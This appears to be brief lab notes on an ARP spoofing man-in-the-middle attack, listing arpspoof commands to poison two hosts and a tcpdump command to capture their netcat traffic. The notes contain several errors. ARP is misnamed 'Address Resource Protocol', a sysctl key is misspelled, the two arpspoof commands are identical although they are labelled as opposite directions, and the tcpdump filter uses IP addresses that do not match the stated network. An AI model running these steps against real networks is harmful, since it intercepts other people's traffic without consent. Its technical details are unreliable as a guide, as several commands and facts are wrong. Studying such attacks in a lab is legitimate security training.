# ARP (Address Resource Protocol) spoofing and sniffing

## Network

* target A - 192.168.0.2
* target B - 192.168.0.3
* attacker - 192.168.0.7

## Tools on the attacker:
* dsniff -> arpspoof
* tcpdump

## Prerequisites

Let's assume target A talks to target B via netcat:
* Target B listens with `nc -l 5555`.
* Target A connects with `nc 192.168.0.3 5555`

IP forwarding is enabled on the middleman machine with either:
* `net.ip4.ip_forward=1` in `/etc/sysctl.conf`
* `sysctl -w net.ipv4.ip_forward=1`
* `echo 1 > /proc/sys/net/ipv4/ip_forward`

IP forwarding setting must be followed by either a `service network restart` or a **reboot**.

## Attack steps

* middleman spoofs ARP from A to B: `arpspoof -i eth0 -t 192.168.0.2 -r 192.168.0.3`
* middleman spoofs ARP from B to A: `arpspoof -i eth0 -t 192.168.0.2 -r 192.168.0.3`
* middleman starts sniffing TCP packets: `tcpdump -A -i eth0 ip src 172.17.0.3 and dst 172.17.0.4 and port 5555`
